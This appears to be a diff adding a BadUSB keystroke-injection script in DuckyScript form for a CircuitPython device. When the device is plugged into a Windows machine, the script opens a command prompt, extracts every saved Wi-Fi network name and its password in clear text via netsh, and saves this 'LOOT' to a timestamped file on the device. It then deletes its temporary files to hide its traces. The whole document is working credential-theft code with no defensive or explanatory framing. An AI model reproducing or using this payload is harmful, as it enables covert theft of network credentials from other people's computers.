@@ -1,0 +1,50 @@
+DELAY 1000
+WINDOWS r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 200
+REM Get all SSID
+STRING cd %USERPROFILE% & netsh wlan show profiles | findstr "All" > a.txt
+ENTER
+REM Create a filter.bat to get all the profile names
+STRING echo SETLOCAL EnableDelayedExpansion^
+ENTER
+ENTER
+STRING for /f "tokens=5*" %%i in (a.txt) do (^
+ENTER
+ENTER
+STRING set val=%%i %%j^
+ENTER
+ENTER
+STRING if "!val:~-1!" == " " set val=!val:~0,-1!^
+ENTER
+ENTER
+STRING echo !val!^>^>b.txt) > filter.bat
+ENTER
+REM Run filter.bat and save all profile names in b.txt
+STRING filter.bat
+DELAY 300
+ENTER
+REM Get current date and time
+STRING powershell (get-date -f yyyy-MM-dd_HH-mm-ss) > date.txt
+DELAY 200
+ENTER
+REM Append the date to the file name
+STRING (for /f "tokens=*" %i in ('type date.txt') do @echo Log_%i.txt) > file.txt
+DELAY 200
+ENTER
+REM Append the file name to the file path
+STRING (for /f "tokens=*" %i in ('type file.txt') do @echo e:\circuitpy\%i) > file_path.txt
+DELAY 200
+ENTER
+REM --> Save all the LOOT in the new file and delete the other files
+STRING (for /f "tokens=*" %i in ('type file_path.txt') do (for /f "tokens=*" %j in (b.txt) do @echo     SSID: %j & netsh wlan show profiles name="%j" key=clear | findstr /c:"Key Content" & echo.) > %i)
+ENTER
+DELAY 1000
+STRING del /Q a.txt b.txt filter.bat date.txt file.txt file_path.txt
+ENTER
+DELAY 500
+STRING exit
+DELAY 500
+ENTER
